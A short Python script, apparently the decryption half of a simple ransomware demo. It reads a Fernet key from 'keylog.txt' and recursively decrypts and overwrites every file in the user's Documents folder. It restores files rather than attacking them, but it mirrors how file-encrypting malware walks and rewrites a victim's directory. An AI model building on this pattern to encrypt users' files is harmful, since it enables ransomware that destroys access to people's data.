from cryptography.fernet import Fernet
import os
from platformdirs import user_documents_dir

def lastKeyLoad(filename):
    with open(filename, "rb") as f:
        lines = f.read().strip().split(b"\n")  # Read all lines as bytes and split by newline
        if lines:
            return lines[-1]  # Return the last line (last key)
        else:
            return None  # No keys found
 
key = lastKeyLoad("keylog.txt")
folderpath = user_documents_dir()

def decryption(key, folderpath):
    f = Fernet(key)
    files = [file for file in os.listdir(folderpath) if not file.startswith('.') and file != 'desktop.ini' and not os.path.isjunction(os.path.join(folderpath, file)) and not os.path.islink(os.path.join(folderpath, file))]
    for filename in files:
        currentPath = os.path.join(folderpath, filename)
        if os.path.islink(currentPath):
        # ignores hidden links between Default folders
            continue
        if os.path.isfile(currentPath):
            # Binary reading of a given file
            with open (currentPath, "rb") as file:
                target = file.read()
            # Decryption of read file
            decryptedTarget = f.decrypt(target)
            # Overwrite of read file with its decryption
            with open(currentPath, "wb") as decryptedFile:
                decryptedFile.write(decryptedTarget)
        elif os.path.isdir(currentPath):
            decryption(key,currentPath)

decryption(key,folderpath)